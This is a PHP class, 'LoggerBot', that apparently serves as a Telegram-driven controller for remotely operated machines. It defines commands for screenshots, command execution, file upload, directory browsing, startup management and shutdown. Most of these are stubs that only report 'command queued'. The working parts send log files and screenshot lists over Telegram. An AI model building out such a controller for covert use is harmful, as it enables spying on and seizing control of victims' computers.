<?php
class LoggerBot
{


    private function sendSystemStatus($recipient, $isClient = false)
    {
        if ($isClient) {
            return "System status command queued";
        }
        $this->sendTelegramMessage($recipient, "System status command queued");
        return "Status command queued";
    }

    // 

    private function handleScreenshot($recipient, $isClient = false)
    {
        if ($isClient) {
            return "Screenshot command queued";
        }
        $this->sendTelegramMessage($recipient, "Screenshot command queued");
        return "Screenshot command queued";
    }

    private function handleFileUpload($recipient, $filePath, $isClient = false)
    {
        if ($isClient) {
            return "File upload command queued";
        }
        $this->sendTelegramMessage($recipient, "File upload command queued");
        return "File upload command queued";
    }

    private function executeCommand($recipient, $command, $isClient = false)
    {
        if ($isClient) {
            return "Execute command queued";
        }
        $this->sendTelegramMessage($recipient, "Execute command queued");
        return "Execute command queued";
    }

    // 

    private function sendLogs($recipient, $isClient = false)
    {
        if ($isClient) {
            return "Logs command not supported on client";
        }
        $logFiles = [
            Config::$ERROR_LOG,
            Config::$WEBHOOK_LOG,
            Config::$TELEGRAM_LOG
        ];
        $results = [];

        foreach ($logFiles as $logFile) {
            if (file_exists($logFile) && filesize($logFile) <= Config::$MAX_LOG_SIZE) {
                $this->sendTelegramFile($recipient, $logFile);
            }
        }
        return "Logs sent";
    }

    // 

    private function getHosts($recipient, $isClient = false)
    {
        if ($isClient) {
            return "Hosts command queued";
        }
        $this->sendTelegramMessage($recipient, "Hosts command queued");
        return "Hosts command queued";
    }

    private function listScreenshots($recipient, $isClient = false)
    {
        if ($isClient) {
            return "Screenshots command not supported on client";
        }
        $files = glob(Config::$SCREENSHOT_DIR . '*.png');
        $fileList = array_map('basename', $files);
        $message = "Screenshots:\n" . (empty($fileList) ? "No screenshots found" : implode("\n", $fileList));
        $this->sendTelegramMessage($recipient, $message);
        return "Screenshot list sent";
    }
    // 

    private function browseDirectory($recipient, $path, $isClient = false)
    {
        if ($isClient) {
            return "Browse directory command queued";
        }
        $this->sendTelegramMessage($recipient, "Browse directory command queued");
        return "Browse directory command queued";
    }

    private function getSystemInfo($recipient, $isClient = false)
    {
        if ($isClient) {
            return "System info command queued";
        }
        $this->sendTelegramMessage($recipient, "System info command queued");
        return "System info command queued";
    }

    // 

    private function goToUrl($recipient, $url, $isClient = false)
    {
        if ($isClient) {
            return "Open URL command queued";
        }
        $this->sendTelegramMessage($recipient, "Open URL command queued");
        return "Open URL command queued";
    }

    private function systemShutdown($recipient, $isClient = false)
    {
        if ($isClient) {
            return "Shutdown command queued";
        }
        $this->sendTelegramMessage($recipient, "Shutdown command queued");
        return "Shutdown command queued";
    }

    private function testTelegram($recipient, $isClient = false)
    {
        if ($isClient) {
            return "Test Telegram command not supported on client";
        }
        $response = $this->makeCurlRequest("https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/getMe", [], false);
        $message = json_decode($response, true)['ok'] ? "Telegram API is working" : "Telegram API test failed.";
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function uploadFromUrl($recipient, $url, $isClient = false)
    {
        if ($isClient) {
            return "Upload from URL command queued";
        }
        $this->sendTelegramMessage($recipient, "Upload from URL command queued");
        return "Upload from URL command queued";
    }

    private function listTasks($recipient, $isClient = false)
    {
        if ($isClient) {
            return "List tasks command queued";
        }
        $this->sendTelegramMessage($recipient, "List tasks command queued");
        return "List tasks command queued";
    }

    private function manageStartup($recipient, $isClient = false)
    {
        if ($isClient) {
            return "Startup command not supported on client";
        }
        $this->sendTelegramMessage($recipient, "Startup management not fully implemented.");
        return "Startup command not supported";
    }

    private function signOut($recipient, $isClient = false)
    {
        if ($isClient) {
            return "Sign out command queued";
        }
        $this->sendTelegramMessage($recipient, "Sign out command queued");
        return "Sign out command queued";
    }

    private function systemSleep($recipient, $isClient = false)
    {
        if ($isClient) {
            return "Sleep command queued";
        }
        $this->sendTelegramMessage($recipient, "Sleep command queued");
        return "Sleep command queued";
    }

    private function systemRestart($recipient, $isClient = false)
    {
        if ($isClient) {
            return "Restart command queued";
        }
        $this->sendTelegramMessage($recipient, "Restart command queued");
        return "Restart command queued";
    }
}
